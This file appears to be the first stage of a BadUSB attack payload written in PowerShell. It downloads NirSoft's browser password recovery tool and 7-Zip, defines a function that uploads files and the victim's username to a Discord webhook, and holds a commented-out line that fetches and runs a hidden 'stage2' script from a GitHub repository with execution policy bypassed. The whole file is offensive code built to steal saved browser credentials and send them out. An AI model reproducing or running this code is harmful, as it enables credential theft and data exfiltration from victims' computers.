# Function to handle the temporary directory
function TempDir {
    # Check if the C:\temp directory exists
    if (-not (Test-Path -Path "C:\temp" -PathType Container)) {
        # The folder does not exist, create it
        New-Item -Path "C:\" -Name "temp" -ItemType Directory
    }

    # Change the directory to C:\temp
    Set-Location -Path "C:\temp"
}

function Get-Nirsoft {
    Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
    Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
    Expand-Archive 7z.zip
    .\7z\7za.exe e wbpv.zip
}

function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))){
        curl.exe -F "file1=@$file" $DiscordUrl
    }
}

TempDir
Get-Nirsoft
<#
Start-Sleep -Seconds 15
# Invoquer stage2 avec la variable $DiscordUrl
Invoke-Expression @"
iex "powershell.exe -w h -NoP -Ep Bypass -Command `$DiscordUrl = '$DiscordUrl'; $(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/W1ns1d3r/W1ns1d3r_t3st/stage2_t3st.ps1')"
"@
#>
